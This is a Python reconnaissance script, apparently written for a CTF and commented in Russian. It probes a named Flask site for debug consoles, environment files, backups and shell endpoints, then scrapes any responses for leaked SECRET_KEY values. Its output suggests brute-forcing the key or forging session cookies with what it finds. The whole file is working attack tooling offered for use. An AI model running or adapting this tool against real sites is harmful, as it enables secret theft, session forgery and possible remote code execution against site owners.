#!/usr/bin/env python3
"""
Flask-разведка: эндпоинты и страницы, откуда часто утекает SECRET_KEY или даётся RCE.
Запуск: python3 flask_recon.py
"""
import warnings
warnings.filterwarnings("ignore", message="urllib3 v2 only supports OpenSSL")
import requests
import re

BASE = "http://sandwich.duckerz.ru"
TIMEOUT = 8
HEADERS = {"User-Agent": "CTF/1.0"}

# Типичные утечки и debug в Flask/Werkzeug
PATHS = [
    "/console",           # Werkzeug debug console (PIN)
    "/debug", "/flask-debug",
    "/.env", "/env", "/config", "/config.py",
    "/api/config", "/api/debug", "/api/env",
    "/static/.env", "/static/config",
    "/backup", "/backup.zip", "/backup.tar",
    "/proc/self/environ",  # иногда проксируют
    "/error", "/errors",   # страницы с трейсами
    "/traceback", "/tb",
    "/__debug__", "/debugger",
    "/shell", "/run", "/exec",
]
# В ответе ищем паттерны секрета
SECRET_PATTERNS = [
    re.compile(rb"SECRET_KEY\s*=\s*['\"]([^'\"]+)['\"]", re.I),
    re.compile(rb"secret_key\s*[:=]\s*['\"]([^'\"]+)['\"]", re.I),
    re.compile(rb"flask.*?secret['\"]?\s*[:=]\s*['\"]([^'\"]+)", re.I),
    re.compile(rb"['\"]secret['\"]?\s*:\s*['\"]([^'\"]+)", re.I),
]


def main():
    print("=== Flask recon: утечки и debug ===\n")
    found_secrets = []
    for path in PATHS:
        url = BASE + path
        try:
            r = requests.get(url, headers=HEADERS, timeout=TIMEOUT, allow_redirects=False)
        except Exception as e:
            print(f"  {path}: error {e}")
            continue
        if r.status_code == 404:
            continue
        body = r.content
        # Ищем секрет в теле
        for pat in SECRET_PATTERNS:
            for m in pat.finditer(body):
                secret = m.group(1).decode("utf-8", errors="ignore").strip()
                if len(secret) < 80 and secret not in found_secrets:
                    found_secrets.append(secret)
                    print(f"  [SECRET?] {path} -> {repr(secret)[:60]}")
        if r.status_code == 200 and len(body) < 50000:
            print(f"  {r.status_code} {len(body):5} b  {path}")
        elif r.status_code != 404:
            print(f"  {r.status_code} {len(body):5} b  {path}")
    if found_secrets:
        print("\n  Найденные кандидаты в SECRET_KEY — подставь в flask_secret_bruteforce.py или подделай куку вручную.")
    else:
        print("\n  Явных утечек не найдено. Всё равно можно прогнать flask_secret_bruteforce.py со своим списком слов.")


if __name__ == "__main__":
    main()
